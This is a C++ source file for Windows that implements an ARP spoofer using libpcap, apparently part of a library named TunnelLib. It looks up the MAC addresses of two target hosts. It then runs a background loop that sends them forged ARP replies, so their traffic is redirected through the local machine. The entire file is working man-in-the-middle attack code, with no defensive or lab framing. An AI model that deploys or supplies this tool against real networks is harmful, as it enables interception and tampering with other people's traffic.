#ifdef __in
#undef __in
#endif
#ifdef __out
#undef __out
#endif
#ifdef __in_opt
#undef __in_opt
#endif
#ifdef __out_opt
#undef __out_opt
#endif

#include "arp_spoofer.h"

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winsock2.h>
#undef min
#undef max

#include <pcap.h>
#include <iphlpapi.h>
#include <iostream>
#include <thread>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")
#pragma comment(lib, "iphlpapi.lib")

namespace TunnelLib {

#pragma pack(push, 1)
struct EthernetHeader {
    uint8_t destMAC[6];
    uint8_t srcMAC[6];
    uint16_t type;
};

struct ArpPacket {
    uint16_t hwType;
    uint16_t protoType;
    uint8_t  hwAddrLen;
    uint8_t  protoAddrLen;
    uint16_t opcode;
    uint8_t  senderMAC[6];
    uint32_t senderIP;
    uint8_t  targetMAC[6];
    uint32_t targetIP;
};

struct ArpFrame {
    EthernetHeader eth;
    ArpPacket arp;
};
#pragma pack(pop)

static uint32_t ipToUint(const std::string& ip) {
    return inet_addr(ip.c_str());
}

static bool getMacByIP(pcap_t* handle, const std::string& ip, uint8_t mac[6]) {
    ULONG macBuf[2] = {0};
    ULONG macLen = 6;
    DWORD destIP = ipToUint(ip);
    DWORD result = SendARP(destIP, 0, macBuf, &macLen);
    if (result == NO_ERROR && macLen == 6) {
        memcpy(mac, macBuf, 6);
        return true;
    }
    return false;
}

static bool getLocalMAC(const std::string& deviceName, uint8_t mac[6]) {
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        for (PIP_ADAPTER_INFO pAdapter = pAdapterInfo; pAdapter; pAdapter = pAdapter->Next) {
            if (deviceName.find(pAdapter->AdapterName) != std::string::npos ||
                deviceName.find(pAdapter->Description) != std::string::npos) {
                memcpy(mac, pAdapter->Address, 6);
                free(pAdapterInfo);
                return true;
            }
        }
    }
    free(pAdapterInfo);
    return false;
}

ArpSpoofer::ArpSpoofer(const ArpConfig& config) : config_(config) {}

ArpSpoofer::~ArpSpoofer() {
    stop();
    if (pcapHandle_) {
        pcap_close((pcap_t*)pcapHandle_);
    }
}

bool ArpSpoofer::initPcap() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcapHandle_ = pcap_open_live(config_.deviceName.c_str(), 65536, 1, 1000, errbuf);
    if (!pcapHandle_) {
        std::cerr << "pcap_open_live failed: " << errbuf << std::endl;
        return false;
    }
    if (!getLocalMAC(config_.deviceName, myMAC_)) {
        std::cerr << "Failed to get local MAC" << std::endl;
        return false;
    }
    if (!getMacByIP((pcap_t*)pcapHandle_, config_.targetA_IP, targetA_MAC_)) {
        std::cerr << "Failed to get MAC for " << config_.targetA_IP << std::endl;
        return false;
    }
    if (!getMacByIP((pcap_t*)pcapHandle_, config_.targetB_IP, targetB_MAC_)) {
        std::cerr << "Failed to get MAC for " << config_.targetB_IP << std::endl;
        return false;
    }
    return true;
}

void ArpSpoofer::sendArpReply(const std::string& targetIP, const std::string& senderIP,
                              const uint8_t targetMAC[6], const uint8_t senderMAC[6]) {
    if (!pcapHandle_) return;
    ArpFrame frame;
    memcpy(frame.eth.destMAC, targetMAC, 6);
    memcpy(frame.eth.srcMAC, senderMAC, 6);
    frame.eth.type = htons(0x0806);
    frame.arp.hwType = htons(1);
    frame.arp.protoType = htons(0x0800);
    frame.arp.hwAddrLen = 6;
    frame.arp.protoAddrLen = 4;
    frame.arp.opcode = htons(2);
    memcpy(frame.arp.senderMAC, senderMAC, 6);
    frame.arp.senderIP = ipToUint(senderIP);
    memcpy(frame.arp.targetMAC, targetMAC, 6);
    frame.arp.targetIP = ipToUint(targetIP);
    pcap_sendpacket((pcap_t*)pcapHandle_, (const u_char*)&frame, sizeof(frame));
}

void ArpSpoofer::spoofingLoop() {
    while (running_) {
        sendArpReply(config_.targetA_IP, config_.spoofedIP_A, targetA_MAC_, myMAC_);
        sendArpReply(config_.targetB_IP, config_.spoofedIP_B, targetB_MAC_, myMAC_);
        std::this_thread::sleep_for(std::chrono::milliseconds(config_.intervalMs));
    }
}

bool ArpSpoofer::start() {
    if (!initPcap()) return false;
    running_ = true;
    workerThread_ = std::thread(&ArpSpoofer::spoofingLoop, this);
    return true;
}

void ArpSpoofer::stop() {
    running_ = false;
    if (workerThread_.joinable())
        workerThread_.join();
}

} // namespace TunnelLib
